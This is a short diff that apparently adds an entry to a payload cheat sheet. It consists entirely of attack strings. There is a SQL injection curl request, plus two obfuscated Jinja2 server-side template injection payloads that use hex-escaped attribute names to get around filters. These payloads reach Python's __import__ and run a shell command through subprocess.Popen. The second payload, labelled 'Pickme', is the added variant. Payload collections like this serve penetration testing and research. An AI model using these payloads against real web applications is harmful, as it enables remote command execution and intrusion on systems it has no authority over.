@@ -3487,6 +3487,11 @@ curl [url]/ -d "input=' or 1=1--+ "
 ()|attr(%27\x5f\x5f\x63lass\x5f\x5f%27)|attr(%27\x5f\x5f\x62ase\x5f\x5f%27)|attr(%27\x5f\x5fsub\x63lasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(333)|attr(%27\x5f\x5finit\x5f\x5f%27)|attr(%27\x5f\x5fbuiltins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimport\x5f\x5f%27)(%27subprocess%27)|attr(%27Popen%27)(%27ls%27,stdout=-1)|attr(%22communicate%22)()
 ```
 
+- Pickme
+
+```python
+()|attr(%27\x5f\x5f\x63lass\x5f\x5f%27)|attr(%27\x5f\x5f\x62ase\x5f\x5f%27)|attr(%27\x5f\x5fsub\x63lasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(333)|attr(%27\x5f\x5finit\x5f\x5f%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuiltins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimport\x5f\x5f%27)(%27subprocess%27)|attr(%27Popen%27)(%27ls%27,stdout=-1)|attr(%22communicate%22)()
+```
 
 
 
